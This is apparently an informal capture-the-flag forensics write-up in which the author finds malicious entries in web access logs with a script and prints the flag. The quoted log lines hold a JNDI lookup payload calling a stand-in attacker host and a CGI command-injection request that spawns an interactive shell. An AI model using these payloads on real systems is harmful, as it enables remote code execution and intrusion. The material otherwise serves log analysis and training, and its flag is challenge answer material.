i get the alot of logs thing like this 9.66.155.64 - - [12/Nov/2025:15:02:57 +0700] "POST /assets/img.png HTTP/1.1" 200 278 "-" "Mozilla/5.0 (compatible; Bot/910; +http://example.com/bot)"
5.24.57.6 - - [12/Nov/2025:08:38:15 +0700] "GET /health HTTP/1.1" 200 3180 "-" "Mozilla/5.0 (compatible; Bot/588; +http://example.com/bot)"
68.158.199.252 - - [12/Nov/2025:20:22:09 +0700] "GET /home HTTP/1.1" 200 11687 "-" "Mozilla/5.0 (compatible; Bot/316; +http://example.com/bot)"
126.84.197.162 - - [12/Nov/2025:18:34:00 +0700] "GET /assets/img.png HTTP/1.1" 200 572 "-" "Mozilla/5.0 (compatible; Bot/625; +http://example.com/bot)",
so i made a solve.py script to found the malicious logs.
and i get the flag.
========== SUSPICIOUS FILES ==========

[+] .\ingest-svc-prod-20251112-5626.log
    ('keyword', '87.80.17.254 - - [12/Nov/2025:23:31:59 +0700] "GET /search?q=${jndi:ldap://evil.example.com/lookup?flag=Gematik2025{Maaf_pUhh_AkU_Sk1ll_1sSu3_B1kIn_Ch4lL_F0r3n}} HTTP/1.1" 200 512 "-" "Mozilla/5.0 (attack)"')
    ('keyword', '87.80.17.254 - - [12/Nov/2025:23:31:59 +0700] "POST /cgi-bin/run.sh HTTP/1.1" 200 64 "-" "curl/7.x (attack)" "cmd=echo Gematik2025{Maaf_pUhh_AkU_Sk1ll_1sSu3_B1kIn_Ch4lL_F0r3n} > /tmp/flag; /bin/sh -i"')

[*] Done.
Gematik2025{Maaf_pUhh_AkU_Sk1ll_1sSu3_B1kIn_Ch4lL_F0r3n}
